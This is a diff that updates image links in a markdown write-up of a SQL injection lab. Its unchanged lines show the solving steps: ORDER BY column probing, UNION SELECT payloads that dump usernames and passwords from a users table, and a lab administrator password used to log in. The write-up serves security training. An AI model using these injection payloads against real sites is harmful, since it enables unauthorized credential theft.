@@ -17,7 +17,7 @@
    ```
 4. Extract the `administrator` password from the response and log in.
 
-![Lab 5 Solution Summary](../Image%20Asset/Lab-05-SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/Pasted%20image%2020260801024859.png)
+![Lab 5 Solution Summary](Pasted%20image%2020260801024859.png)
 
 ---
 
@@ -32,13 +32,13 @@ Test using `ORDER BY`:
 ```
 
 - **Order By 1**:
-![Lab 5 Order By 1](../Image%20Asset/Lab-05-SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/Pasted%20image%2020260801024940.png)
+![Lab 5 Order By 1](Pasted%20image%2020260801024940.png)
 
 - **Order By 2**:
-![Lab 5 Order By 2](../Image%20Asset/Lab-05-SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/Pasted%20image%2020260801025029.png)
+![Lab 5 Order By 2](Pasted%20image%2020260801025029.png)
 
 - **Order By 3 Error**:
-![Lab 5 Order By 3 Error](../Image%20Asset/Lab-05-SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/Pasted%20image%2020260801025117.png)
+![Lab 5 Order By 3 Error](Pasted%20image%2020260801025117.png)
 
 > [!NOTE]
 > Receiving an error at `ORDER BY 3` confirms **2 columns**.
@@ -49,7 +49,7 @@ Test both columns with text strings:
 /filter?category=Corporate+gifts'+UNION+SELECT+'a','a'--
 ```
 
-![Lab 5 Confirm Text Columns](../Image%20Asset/Lab-05-SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/Pasted%20image%2020260801025420.png)
+![Lab 5 Confirm Text Columns](Pasted%20image%2020260801025420.png)
 
 Both columns accept text values! ✅
 
@@ -59,7 +59,7 @@ Inject query to select `username` and `password` from `users`:
 /filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--
 ```
 
-![Lab 5 Dump Users Table](../Image%20Asset/Lab-05-SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/Pasted%20image%2020260801025945.png)
+![Lab 5 Dump Users Table](Pasted%20image%2020260801025945.png)
 
 #### Extracted Credentials:
 | Username | Password |
@@ -73,7 +73,7 @@ Go to `/login` and submit:
 - **Username**: `administrator`
 - **Password**: `p7humoseua6345awkvq2`
 
-![Lab 5 Solved Admin Login](../Image%20Asset/Lab-05-SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables/Screenshot%202026-08-01%20031041.png)
+![Lab 5 Solved Admin Login](Screenshot%202026-08-01%20031041.png)
 
 > [!SUCCESS]
 > **Lab Solved**: Successfully logged in as Administrator!
